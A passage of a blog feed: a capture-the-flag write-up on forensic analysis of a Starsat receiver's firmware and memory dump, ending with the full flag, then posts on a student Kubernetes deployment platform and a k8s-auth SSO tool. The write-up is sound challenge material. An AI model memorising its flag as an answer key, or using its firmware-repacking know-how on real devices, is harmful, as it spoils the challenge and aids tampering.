glance, no strings or something in there, and can’t help us much to delve into the remote control unit in use.</p>\n<p>Time to google for a way to decrypt such chipset firmware. Let’s use the keyword  <code>ALI3329</code>  or  <code>ALI3511</code>  as they are the most common chipset used in these devices and combine the search with decrypt or unpack tool.</p>\n<p>For example:</p>\n<p><img data-src=\"https://i.imgur.com/DfscXB4.png\" alt=\"\"></p>\n<p>And in Arabic:</p>\n<p><img data-src=\"https://i.imgur.com/rdG9k09.png\" alt=\"\"></p>\n<p>Using the tool, we determine that the model is SR-2000HD HYPER and the remote control is SR-2000HD HYPER. Hence the brand is Starsat.</p>\n<p><img data-src=\"https://i.imgur.com/uWfBYaJ.png\" alt=\"\"></p>\n<p>The unpack and repack features are used to decrypt and extract parts of the firmware like the bootloader, maincode, user data if any was supplied by the manufacturer, the menu, the remote, and sometimes a softcam (that’s out of our scope today, maybe in another challenge!). And the repack to insert modified parts and RSA encrypt the whole thing again. Like for instance, we can insert the main menu (including themes and applications) or the remote control unit of a different model or brand and repack it to be used with the device we have, as long as they are using the very same chipset. Well this time, rest assured it is the Hyper remote control and when we talk about key code we mean the IR Infrared key code.</p>\n<p>So the whole memory dump thing and the firmware kind of contain similar stuff at least, one being encrypted and the other not.</p>\n<p>See here, the content of the folder when unpacked.</p>\n<p><img data-src=\"https://i.imgur.com/P8IBsRt.png\" alt=\"\"></p>\n<p>So why not, giving the dump a try and unpack it as well, we are chasing the user data part anyway. And the tool might very much help. Otherwise I will show how to proceed manually knowing the offsets and lengths found on a forum.</p>\n<h3 id=\"finding-the-show\"><a class=\"markdownIt-Anchor\" href=\"#finding-the-show\">#</a> Finding the show</h3>\n<p>As we said before, we can deal with this part either using the tool or manually.<br>\nWell, the tool was able to yield this:</p>\n<p><img data-src=\"https://i.imgur.com/f1fon6N.png\" alt=\"\"></p>\n<p>Very nice, we can see  <code>database.sdx</code>  file there!</p>\n<p>Well, to proceed manullay you need to know the offsets and lengths beforehand.<br>\nThis is what we meant:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : Bootloader.bin</span><br><span class=\"line\">SIZE : 128,00 KB</span><br><span class=\"line\">CRC : 0x00AF7F6C</span><br><span class=\"line\">offset : 0x00000128</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : maincode.bin</span><br><span class=\"line\">SIZE : 3,25 MB</span><br><span class=\"line\">CRC : 0x19E8C348</span><br><span class=\"line\">offset : 0x00020128</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : menu.bin</span><br><span class=\"line\">SIZE : 1,38 MB</span><br><span class=\"line\">CRC : 0x10934143</span><br><span class=\"line\">offset : 0x00360128</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : Database.sdx</span><br><span class=\"line\">SIZE : 9,80 KB</span><br><span class=\"line\">CRC : 0x00146C71</span><br><span class=\"line\">offset : 0x004C0128</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : softcam.bin</span><br><span class=\"line\">SIZE : 42,38 KB</span><br><span class=\"line\">CRC : 0x008D5F15</span><br><span class=\"line\">offset : 0x004C2860</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : sattp.bin</span><br><span class=\"line\">SIZE : 12,54 KB</span><br><span class=\"line\">CRC : 0x00097FDA</span><br><span class=\"line\">offset : 0x004CD1E8</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">Name : Padding.bin</span><br><span class=\"line\">SIZE : 522,06 KB</span><br><span class=\"line\">CRC : 0x040E1F6B</span><br><span class=\"line\">offset : 0x004D040C</span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure>\n<p>Found here: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHVuaXNpYS1zYXQuY29tL2ZvcnVtcy90aHJlYWRzLzMyNDI3NjEvcGFnZS00Nw==\">https://www.tunisia-sat.com/forums/threads/3242761/page-47</span></p>\n<p>We know  <code>database.sdx</code>  holds the user data meaning the channels. sattp is another file that holds the different satellites and their frequencies aka transponders.</p>\n<p>When we open the file in a hex editor, We can’t read any useful information out of it. This means that there should be a tool in place to view and edit the channels for the specific chipset family we are dealing with as the file seems highly compressed.</p>\n<p>Here’s a view from hex editor first.</p>\n<p>Starts off like this</p>\n<p><img data-src=\"https://i.imgur.com/7FHWF6K.png\" alt=\"\"></p>\n<p>And ends padded with 0xFF</p>\n<p><img data-src=\"https://i.imgur.com/xqvWPxc.png\" alt=\"\"></p>\n<p>Let’s google a bit…</p>\n<p><img data-src=\"https://i.imgur.com/P5bXWY4.png\" alt=\"\"></p>\n<p>We got this</p>\n<p><img data-src=\"https://i.imgur.com/hVzUWC9.png\" alt=\"\"></p>\n<p>When trying to first open the database, we got this error message</p>\n<p><img data-src=\"https://i.imgur.com/ASWzJB9.png\" alt=\"\"></p>\n<p>And the issue is that the Userdata has a static size as indicated before. As the receiver’s capacity fits a maximum of 6100 channels. So the database file is padded with 0xFF to reach the maximum size. Let’s get rid of the padded data and try again…</p>\n<p><img data-src=\"https://i.imgur.com/NUIk82u.png\" alt=\"\"></p>\n<p>Now, it’s working like charm, and I already see some familiar TV channels on Astra 1 (19.2 East).</p>\n<p>Let’s expand the favorites section</p>\n<p><img data-src=\"https://i.imgur.com/AmkpQPE.png\" alt=\"\"></p>\n<p>And there is Sky Sports Main Event, UK-based sports channel that is part of BSkyB or Sky Group, pay-television channel and availble for satellite subsribers via Eurobird 1, Astra 2 (28.2 East). Sky Sports Main Event broadcasts the biggest events of sports in the UK.</p>\n<p>Now, great work to reach this point, but we are not done yet. We need to find the right show at that past date, meaning at 1:07 AM on February the 1st, 2020.</p>\n<p>Well, Sky TV Guide won’t keep such data for more than a week or two, so we need to find another way.</p>\n<p>Guess you know what we mean, what else than the way back machine!</p>\n<p>Head over to <span class=\"exturl\" data-url=\"aHR0cDovL2FyY2hpdmUub3Jn\">archive.org</span> and submit the link for the Sky TV Guide and try to narrow your search to a date that’s equal or close to the date in question, as shown below!</p>\n<p><img data-src=\"https://i.imgur.com/B5scqzJ.png\" alt=\"\"></p>\n<p>And that is the first part of the flag:  <code>live_rugby_7's</code>  or  <code>live_rugby_7s</code></p>\n<h3 id=\"finding-the-keycodes\"><a class=\"markdownIt-Anchor\" href=\"#finding-the-keycodes\">#</a> Finding the keycodes</h3>\n<p>We know it is Starsat SR-2000HD Hyper’s remote control, well unless you have the same remote control or probably a remote of the same brand and an Arduino card embedded with an IR receiver, you will need to improvise! Like check online there GitHub repos that keep track of IR key codes for different remotes. Or you can use a forum like <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVtb3RlY2VudHJhbC5jb20v\">https://www.remotecentral.com/</span> to find the key codes for the remote control.</p>\n<p>However for this part, we will use an Android app like IRplus or any alternatives and pick the device in question from the list then head over to check the keys, we will provide screenshots for what we’ve found. Since it is the simplest and fastest way.</p>\n<p>This is the LIRC protcol of Starsat <span class=\"exturl\" data-url=\"aHR0cHM6Ly9saXJjLnNvdXJjZWZvcmdlLm5ldC9yZW1vdGVzL3N0YXJzYXQvMTIw\">https://lirc.sourceforge.net/remotes/starsat/120</span></p>\n<p>We are looking for NEC, so we found an app for that.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcnBsdXMtcmVtb3RlLmdpdGh1Yi5pby8=\">net.binarymode.android.irplus</span></p>\n<ol>\n<li>Selecting the remote control from the list:</li>\n</ol>\n<p><img data-src=\"https://i.imgur.com/3hjuMYS.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>Exporting the remote config and checking the Channel Up arrow and Channel Down arrow</li>\n</ol>\n<p><img data-src=\"https://i.imgur.com/lsXXO6K.png\" alt=\"\"></p>\n<p>And that is the second part of the flag:  <code>00ff30cf_00ff8877</code></p>\n<p>we can make sure that is the correct format using a website like <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueWFtYWhhLmNvbS95cGFiL2lyaGV4X2NvbnZlcnRlci5hc3A=\">https://www.yamaha.com/ypab/irhex_converter.asp</span><br>\nconverting NEC 32-bit to Pronto hex format (RAW HEX) and then to global caché to see the full sendIR command…</p>\n<h3 id=\"finding-the-expiration-date\"><a class=\"markdownIt-Anchor\" href=\"#finding-the-expiration-date\">#</a> Finding the expiration date</h3>\n<p>Now for the fun part, if you dig around the web about Starsat 2000 Hyper you will end up with one official built in service, Apollo that offers IPTV as well as VOD Video on Demand.</p>\n<p>And there is an online service to renew and check your current subscription by just providing the serial number.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5yZW5ld2JveC5uZXQvaW5kZXgucGhw\">www.renewbox.net</span></p>\n<p>The serial number in most cases is a long number like consists of maybe more than 10 digits. And it can’t be in the firmware since it is released to the public to update their devices. So it must be within the memory of the device itself.</p>\n<p>Let’s grep that easily!</p>\n<p><img data-src=\"https://i.imgur.com/XmWhATI.png\" alt=\"\"></p>\n<p>And there it is, the serial number, let’s query the IPTV validity.</p>\n<p><img data-src=\"https://i.imgur.com/lTGDuFS.png\" alt=\"\"></p>\n<p>And the last part of the flag is  <code>20141105</code></p>\n<h3 id=\"final-words\"><a class=\"markdownIt-Anchor\" href=\"#final-words\">#</a> Final Words</h3>\n<p>Flag: <strong>Securinets{live_rugby_7s_00ff30cf_00ff8877_20141105}</strong></p>\n<p>GGs <strong>th3_r0n1ns</strong> for solving this challenge</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/06/03/Kubernetes/post/",
            "url": "http://example.com/2023/06/03/Kubernetes/post/",
            "title": "Streamlined Application Deployemet using Kubernetes",
            "date_published": "2023-06-03T16:38:55.000Z",
            "content_html": "<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>As second-year engineering students, we embarked our academic group project that pushes us beyond our limits. Being self-proclaimed cloud-native and Kubernetes geeks, we decided to venture into an unfamiliar territory with an advanced project. Our goal? To unravel the mysteries of Heroku, Vercel, and On-Render, the leading PaaS solutions! And here is the twist, we were running out of time, and neither ChatGPT nor Google can help us. We are mad, and we actually did it in 4 days! Fellow adventurers, let’s get you to feel the glimpse of what we have been through in just 4 days to build our project codenamed Kli8nt for streamlined application deployments into the Kubernetes realm</p>\n<p>Fueled by the increasing demand for a unified platform that encompasses front-end hosting, backend deployment, and database management, our team leveraged our expertise in DevOps, Kubernetes, and web development to establish a robust and scalable solution that is client-friendly and K8s-able, hence the name Kli8nt. It is our way to design a mechanism that’s a proof-of-concept to the leading PaaS solutions</p>\n<h1 id=\"project-details\"><a class=\"markdownIt-Anchor\" href=\"#project-details\">#</a> Project Details  :</h1>\n<h2 id=\"high-level-architecture\"><a class=\"markdownIt-Anchor\" href=\"#high-level-architecture\">#</a> High Level Architecture</h2>\n<p>Our system consists of various interconnected components that work together seamlessly. At the front-end, users interact with the system and provide the necessary information for application deployment. The backbone of our system is the backend, which handles authentication, data storage, and serves as the communication hub with the clusters. It establishes a websocket connection to deliver real-time logs to the user. To facilitate efficient communication between the backend and clusters, we rely on RabbitMQ, a messaging system that ensures reliable information exchange. The clusters themselves take charge of the build and deployment operations, guided by custom controllers to ensure efficiency and accuracy. Lastly, Kafka, our robust data streaming platform, stores and streams application logs from the clusters to the user. Together, these components form a cohesive system that enables smooth and efficient application deployment.</p>\n<p><img data-src=\"https://i.imgur.com/fEOyFeQ.png\" alt=\"\"></p>\n<h2 id=\"user-interface\"><a class=\"markdownIt-Anchor\" href=\"#user-interface\">#</a> User Interface</h2>\n<p>The User Interface serves as the primary interaction point for developers using the<br>\nKli8nt platform. Designed with simplicity and ease of use in mind, the UI provides<br>\na seamless experience for users to connect to their GitHub accounts, manage their<br>\nrepository specifications, and initiate deployments. We aim to streamline the<br>\napplication management process and empower developers to effortlessly deploy<br>\ntheir applications.</p>\n<p><img data-src=\"https://imgur.com/O5fW0GG.png\" alt=\"\"></p>\n<h2 id=\"user-authentication\"><a class=\"markdownIt-Anchor\" href=\"#user-authentication\">#</a> User Authentication</h2>\n<p>Kli8nt leverages the robust authentication capabilities of GitHub OAuth2 as its primary method for user login and authorization. By utilizing this powerful authentication mechanism, users can grant the platform access to their repositories. With the generated Personal Access Token (PAT) associated with the authenticated user, Kli8nt gains the ability to clone both private and public repositories, utilizing the functionalities provided by the GitHub API. This approach ensures secure and seamless integration with GitHub, allowing users to enjoy a streamlined experience while maintaining the necessary permissions and access controls.</p>\n<p><img data-src=\"https://imgur.com/KEoSXvr.png\" alt=\"\"></p>\n<h2 id=\"backend-service\"><a class=\"markdownIt-Anchor\" href=\"#backend-service\">#</a> Backend Service</h2>\n<p>The backend service is the backbone of the platform, ensuring efficient functionality by handling user requests, processing deployment tasks, managing logs, and facilitating seamless communication between components. It plays a vital role in request handling and routing, ensuring user requests are directed to the appropriate components for further processing. Additionally, it handles user authentication and authorization, ensuring secure access to the platform. Integration with RabbitMQ allows for the handling and queuing of deployment requests, while task scheduling ensures efficient and ordered processing. The backend service also integrates with GitHub’s Deployment Environment, facilitating synchronization and updates for deployments. Logs are streamed and stored using Kafka, with a backend endpoint responsible for streaming logs back to users for monitoring. Database interaction with PostgreSQL allows for data storage and retrieval related to user configurations, deployment records, and other relevant information, ensuring data consistency and integrity through GORM. Overall, the backend service acts as a crucial orchestrator, ensuring the smooth operation and effective management of the platform’s core functionalities.</p>\n<p><img data-src=\"https://i.imgur.com/WyYpyTw.png\" alt=\"\"></p>\n<h2 id=\"the-messaging-queue-system\"><a class=\"markdownIt-Anchor\" href=\"#the-messaging-queue-system\">#</a> The Messaging Queue System</h2>\n<p>To manage and queue deployment requests, we’ve integrated RabbitMQ. Simply put, it is a software where queues are defined, to which applications connect in order to transfer messages. For when a deployment request is received, the backend enqueues the task into a BUILD queue to the Kubernetes BUILD Operator. This ensures that each task is processed in the right order. The Kubernetes DEPLOY Operator in turn enqueus deployment results back here though the INFORM queue.</p>\n<p><img data-src=\"https://i.imgur.com/zNOA4Lz.png\" alt=\"\"></p>\n<h2 id=\"the-build-and-deploy-kubernetes-custom-controller\"><a class=\"markdownIt-Anchor\" href=\"#the-build-and-deploy-kubernetes-custom-controller\">#</a> The Build and Deploy Kubernetes Custom Controller</h2>\n<p>The clusters are responsible for the build and deployment operations. These processes are managed by custom controllers, ensuring efficiency and accuracy in deploying applications.</p>\n<p><img data-src=\"https://i.imgur.com/kTZmlxJ.png\" alt=\"\"></p>\n<h2 id=\"the-build-kubernetes-custom-controller\"><a class=\"markdownIt-Anchor\" href=\"#the-build-kubernetes-custom-controller\">#</a> The Build Kubernetes Custom Controller</h2>\n<p>The build controller plays a critical role in initiating the build process for each application. It acts as a listener for the queue served by RabbitMQ, enabling it to initiate the build process. When a new application is added to the queue, the controller creates an isolated environment specifically for that application. Within this isolated environment, it launches a dedicated build process. This process involves tasks such as cloning the repository and generating a Dockerfile based on the application’s stack and programming language, starting the Kaniko process to initiate the build, which includes compiling the source code, resolving dependencies, and creating a container image then pushing the resulting container image to a private registry.</p>\n<p>After completing the build and push process, the isolated environment is terminated and deleted, in addition, the controller publishes a message to the deployment queue served by RabbitMQ. This queue holds the applications that are scheduled to be deployed by the deploy controller. This ensures a clean and efficient workflow, as each build process operates in its isolated context. By leveraging the build controller’s capabilities, applications can be built and prepared for deployment without interference or conflicts with other ongoing builds</p>\n<h2 id=\"the-deploy-kubernetes-custom-controller\"><a class=\"markdownIt-Anchor\" href=\"#the-deploy-kubernetes-custom-controller\">#</a> The Deploy Kubernetes Custom Controller</h2>\n<p>After the build process concludes and the build controller sends an element to the queue, the deploy controller consumes the queue and initiates the deployment process. This involves creating a deployment object that includes a pod. The application’s Docker image is then pulled and run within this pod. Simultaneously, a cluster IP service is created and associated with the deployment, enabling internal communication within the cluster.</p>\n<p>The deploy controller takes charge of exposing the application externally and adding a TLS/SSL certificate. It achieves this by adding a route rule for the service within the ingress configuration. Additionally, it adds TLS/SSL configuration to the Ingress, allowing the application to be accessed securely via HTTPS. By utilizing Nginx Ingress, the controller ensures that the application is reachable and accessible with the desired HTTPS protocol and has a specific subdomain for the application.</p>\n<p>Once the application is successfully deployed and exposed to the TLS certificate, the deploy controller notifies the backend server that the application is now ready for user access. This communication informs the backend server that the newly deployed application is available and can be utilized by users.</p>\n<h2 id=\"the-log-streaming-controller\"><a class=\"markdownIt-Anchor\" href=\"#the-log-streaming-controller\">#</a> The Log Streaming Controller</h2>\n<p>Another important aspect in such provided service, is that the user would like to have a vision over his application while and after its being prepared and sent to production. To deliver such a feature, we have implemented another controller in go, that’s responsible for listening to Pod’s lifecycle events, made possible thanks to the Shared Informer feature in the Kubernetes API which is a local cache kind of resource made to be consumed. Whenever a new Deployment is up and running, grab its logs and stream them real time to another environment to be stored. This environment being Apache Kafka, an open source distributed message streaming that’s suited for high performance data pipelines. Our Kafka is running in its own managed cluster at Confluent, a KaaS provider with additional cool features that we liked while using them (like a nice user-friendly dashboard, a built-in REST API, etc…). Kafka is going to stream the logs, each application in its own kafka topic or event, directly to the backend, and store them for future requests -so you don’t really have to be there at the right time, whenever you request them you’ll get them and if you are there already you get them live.</p>\n<p><img data-src=\"https://i.imgur.com/UomqhLd.png\" alt=\"\"></p>\n<h1 id=\"the-conclusion\"><a class=\"markdownIt-Anchor\" href=\"#the-conclusion\">#</a> The conclusion</h1>\n<p>Our end-of-year project theoretically proposes and empirically validate a system design able to streamline the process of deploying any mciroservice application living in Github to Kubernetes on Cloud. This project is our gateway to our graduation projects as well as internship opportunities this summer, and would be a great addition to our professional journeys</p>\n<h1 id=\"meet-the-team\"><a class=\"markdownIt-Anchor\" href=\"#meet-the-team\">#</a> Meet the Team</h1>\n<p>Along with the immense support from our supervisor Mr. Bassem Ben Saleh and his esteemed jury.<br>\nWe would like to extend a heartfelt thank you to our families and close ones for their support and encouragement during late nights and long hours of work.</p>\n<div class=\"links\"><div class=\"item\" title=\"Mohamed Rafraf - Raf²\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9tb2hhbWVkLXJhZnJhZi5naXRodWIuaW8=\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQGoi9OLQy5yfg/profile-displayphoto-shrink_800_800/0/1635769397295?e=1691020800&v=beta&t=IOYj31PodnHo-vWlY3lHvfLTCAzBeGPclWqCkdQl1bE\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9tb2hhbWVkLXJhZnJhZi5naXRodWIuaW8=\">Mohamed Rafraf - Raf²</span>\n          <p class=\"desc\">Kubernetes Engineer</p>\n          </div></div><div class=\"item\" title=\"Adam Lahbib - Adm\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9hZGFtbGFoYmliLm1l\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQEeg7KDib8qCQ/profile-displayphoto-shrink_800_800/0/1682525314941?e=1691020800&v=beta&t=O-T0VjepTffxrdxGNc4jwwPleeh-rt6RWlMF6gol1VQ\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9hZGFtbGFoYmliLm1l\">Adam Lahbib - Adm</span>\n          <p class=\"desc\">Backend Engineer / DevOps</p>\n          </div></div><div class=\"item\" title=\"Med Sofiene Barka - NieMand\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1lLw==\" data-background-image=\"https://pbs.twimg.com/profile_images/1607462313182756867/WHEAVH9d_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cuaG1sbmRyLm1lLw==\">Med Sofiene Barka - NieMand</span>\n          <p class=\"desc\">Software Engineer</p>\n          </div></div><div class=\"item\" title=\"Skander Soltane - RedNax\" style=\"--block-color:#ff0378;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3NrYW5kZXItc29sdGFuZQ==\" data-background-image=\"https://media.licdn.com/dms/image/D4D03AQGD3BI1PkShag/profile-displayphoto-shrink_800_800/0/1676590747987?e=1691020800&v=beta&t=Jo1SN1nqWZCCeJ7KyxP1f6NgWUPw4DyMGmkXPQrYvWg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3NrYW5kZXItc29sdGFuZQ==\">Skander Soltane - RedNax</span>\n          <p class=\"desc\">Software Developer</p>\n          </div></div><div class=\"item\" title=\"Dr. Bassem Ben Salah\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2Jhc3NlbS1iZW4tc2FsYWgtMzQ4N2EyNTkv\" data-background-image=\"https://media.licdn.com/dms/image/C4D03AQEuhp7TFHjE3Q/profile-displayphoto-shrink_800_800/0/1549533675903?e=1691020800&v=beta&t=AuBIN0Obuyu-dqcWr2HWZMS9qJNZKzAJiw5KnuVOLSg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2Jhc3NlbS1iZW4tc2FsYWgtMzQ4N2EyNTkv\">Dr. Bassem Ben Salah</span>\n          <p class=\"desc\">Our Supervisor</p>\n          </div></div></div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/28/Kubernetes/k8s-auth/",
            "url": "http://example.com/2023/04/28/Kubernetes/k8s-auth/",
            "title": "SSO-based authentication mechanism for multi-clusters",
            "date_published": "2023-04-28T10:29:37.000Z",
            "content_html": "<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<h2 id=\"how-it-comes\"><a class=\"markdownIt-Anchor\" href=\"#how-it-comes\">#</a> How it comes</h2>\n<p>As a university student, I was assigned to create an authentication project for a specific system. But instead of choosing a traditional approach like Kerberos, I decided to spice things up and bring Kubernetes and cloud-native technologies into the mix (Typical Me). After diving into the official documentation, I was hit with a barrage of authentication strategies like X509 client certs, Static Token File, Bootstrap tokens, Service Accounts, OIDC tokens, and more. My head was spinning! Then I stumbled upon some existing authentication tools like Dex, Keycloak, and Pinniped. Terms like OIDC and OAuth2 were thrown around left and right. But I wasn’t intimidated! I accepted the challenge and declared: “It’s implementation time!” And thus, the k8s-auth project was born.</p>\n<h2 id=\"why-k8s-auth-is-born\"><a class=\"markdownIt-Anchor\" href=\"#why-k8s-auth-is-born\">#</a> Why k8s-auth is born</h2>\n<p>Managing access to Kubernetes clusters can be a challenging task, especially in large organizations where multiple teams and users need different levels of permissions. While Kubernetes provides a robust RBAC system, configuring and maintaining it can be time-consuming and error-prone, particularly if you have many clusters to manage.<br>\nIt can feel like you’re playing a never-ending game of whack-a-mole, trying to keep up with the constant changes and updates. And let’s be honest, it’s not the most exciting task in the world. Moving from one cluster to another, constantly changing contexts, generating kubeconfig for users, and dealing with permission problems can quickly become a chore.</p>\n<p><img data-src=\"https://imgur.com/a5zaVhH.png\" alt=\"\"></p>\n<h2 id=\"before-starting\"><a class=\"markdownIt-Anchor\" href=\"#before-starting\">#</a> Before Starting</h2>\n<p>Before you start reading this blog post, let’s make sure you’re ready to dive into the k8s-auth server world. First, make sure you have a solid understanding of Kubernetes basics and RBAC, as we’ll be building on those concepts. Don’t worry, we won’t ask you to explain any Kubernetes concept in binary code. We just need you to understand what a service account is, what roles and role bindings mean, and why a service account needs a secret. So, if these concepts are still a mystery to you, go ahead and brush up on your Kubernetes knowledge before jumping in. And if you need a refresher, don’t worry, we won’t judge you. We’ll just send you back to Kubernetes school.</p>\n<h1 id=\"k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\"><a class=\"markdownIt-Anchor\" href=\"#k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\">#</a> K8S-AUTH : The SSO-Based Authentication Mechanism for Multi-Clusters!</h1>\n<h2 id=\"what-is-k8s-auth\"><a class=\"markdownIt-Anchor\" href=\"#what-is-k8s-auth\">#</a> What is k8s-auth ?</h2>\n<p>K8s-auth is a tool that provides authentication and authorization mechanisms for multiple Kubernetes clusters. With k8s-auth, users can authenticate to multiple clusters using a single set of credentials. This eliminates the need for users to have different credentials for different clusters, simplifying the authentication process. K8s-auth also allows administrators to manage user and group permissions across multiple clusters from a single centralized location, making it easier to maintain security and access control.</p>\n<p><img data-src=\"https://imgur.com/awkZvAb.png\" alt=\"\"></p>\n<h2 id=\"the-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#the-authentication-server\">#</a> The Authentication server</h2>\n<p>“K8s-Auth Server” is an open-source authentication server designed to simplify the authorization and authentication process for users and groups within specific Kubernetes clusters. With this server, administrators can easily manage access controls for multiple clusters, all from a centralized location.</p>\n<p>With the k8s-auth server, you can say goodbye to the headache of managing RBAC configurations across multiple clusters. Instead, you can focus on the fun part of being an admin - creating users, deleting users, modifying users, creating groups, deleting groups, modifying groups, and more! And the best part? You get to do it all with a single set of credentials, like a master key that unlocks all the doors to the kingdom of Kubernetes.</p>\n<p>But wait, there’s more! With SSO-based access, users can connect to multiple clusters with different permissions based on their role on each cluster, all without having to enter a password a million times. It’s like having a backstage pass to all the coolest Kubernetes events without ever having to wait in line.</p>\n<h2 id=\"how-this-server-communicate-with-clusters\"><a class=\"markdownIt-Anchor\" href=\"#how-this-server-communicate-with-clusters\">#</a> How This Server Communicate with Clusters ?</h2>\n<p>K8s-Auth Server is designed to work seamlessly with K8s-Auth Controller, a cloud-native application that is deployed within the Kubernetes cluster. This controller acts as an agent for the server, facilitating communication between the server and the cluster.</p>\n<p><img data-src=\"https://imgur.com/0PK9Sj5.png\" alt=\"\"></p>\n<p>Before a cluster can be used with K8s-Auth Server, it must be registered with the server by the administrator. When a cluster is registered, a secret token is created, which must be used by the agent/controller deployed within the cluster to verify its existence. Once the agent/controller is verified, a connection between the cluster and the server is opened (web socket) for data communication.</p>\n<p><img data-src=\"https://imgur.com/F1EVKK3.png\" alt=\"\"></p>\n<h2 id=\"how-to-interact-with-this-server\"><a class=\"markdownIt-Anchor\" href=\"#how-to-interact-with-this-server\">#</a> How to interact with this Server</h2>\n<p>K8s-Auth Server comes with a powerful CLI utility that can be used by both administrators and users. The CLI behaves differently based on the user’s role - administrators can create, modify, and delete users, groups, and clusters, while normal users can check the clusters that they are authorized to connect with. Once the users selects the cluster they want to authenticate with, the CLI will automatically generate a kubeconfig file, making it easy for users to connect to the cluster and start working.</p>\n<h2 id=\"how-users-logs-to-the-server\"><a class=\"markdownIt-Anchor\" href=\"#how-users-logs-to-the-server\">#</a> How users logs to the server</h2>\n<p>To connect to any cluster, users must first authenticate with the K8s-Auth Server. Authentication with the server is done using OAuth2 with Google, allowing users to use one set of credentials to connect to multiple clusters with different permissions based on their role on each cluster. This type of authentication can be referred to as SSO-based authentication.</p>\n<h2 id=\"what-happen-when-user-want-to-authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#what-happen-when-user-want-to-authenticate-to-a-cluster\">#</a> What happen when user want to authenticate to a cluster ?</h2>\n<p>On the user side, when a user logs into the K8s-Auth Server, they can check the clusters they are authorized to access. After selecting the desired cluster, a request is sent to the server, which checks if the user is authorized to connect. If authorized, the server sends a request to the specific agent/controller, which creates the necessary Kubernetes resources, such as service accounts, roles, role bindings, and secrets, allowing the user to connect to the cluster and return the token and ca.crt that allow the automatic generation of the kubeconfig.</p>\n<h2 id=\"the-agentcontroller-role\"><a class=\"markdownIt-Anchor\" href=\"#the-agentcontroller-role\">#</a> The Agent/Controller role</h2>\n<p>The agent/controller also manages the lifecycle of the secret and token, deleting them and all related roles and bindings after they expire or are no longer needed. For example, if an administrator decides to remove a user from a cluster, the agent/controller will delete the secret that holds the user’s token, as well as the service account, roles, and bindings associated with that user.</p>\n<h2 id=\"before-demo\"><a class=\"markdownIt-Anchor\" href=\"#before-demo\">#</a> Before DEMO</h2>\n<div class=\"note 